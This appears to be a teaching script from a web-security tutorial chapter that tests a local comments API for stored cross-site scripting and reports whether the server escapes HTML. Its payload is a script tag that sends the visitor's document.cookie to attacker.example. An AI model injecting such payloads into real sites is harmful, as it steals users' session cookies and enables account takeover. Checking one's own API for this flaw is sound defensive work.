#!/usr/bin/env bash
#
# Chapter 15 — Stored XSS via product comments
#
# 1. POST a comment containing a <script> tag to a product
# 2. GET the comments list and check whether the payload comes back
#    - Vulnerable controller:  body returned verbatim with <script> intact
#    - Fixed controller:       body returned with HTML entities escaped

set -euo pipefail
API="${API:-http://localhost:8080}"
PRODUCT_ID='aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'   # mechanical keyboard
PAYLOAD='<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>'

bold() { printf '\033[1m%s\033[0m\n' "$*"; }

bold "[1/2] Post a comment with a <script> payload"
BODY=$(python3 -c "import json,sys; print(json.dumps({'productId':'$PRODUCT_ID','authorEmail':'evil@x.com','body':sys.argv[1]}))" "$PAYLOAD")
curl -sS -X POST "${API}/api/comments" \
  -H 'Content-Type: application/json' \
  -d "$BODY" | python3 -m json.tool || true
echo

bold "[2/2] Read comments back"
RESPONSE=$(curl -sS "${API}/api/comments?productId=${PRODUCT_ID}")
echo "$RESPONSE" | python3 -m json.tool
echo

if echo "$RESPONSE" | grep -q '<script>'; then
  bold "ATTACK SUCCEEDED — raw <script> is in the API response."
  echo "  Any frontend rendering this with dangerouslySetInnerHTML will execute it."
  exit 1
else
  bold "ATTACK BLOCKED — server escaped the HTML."
fi
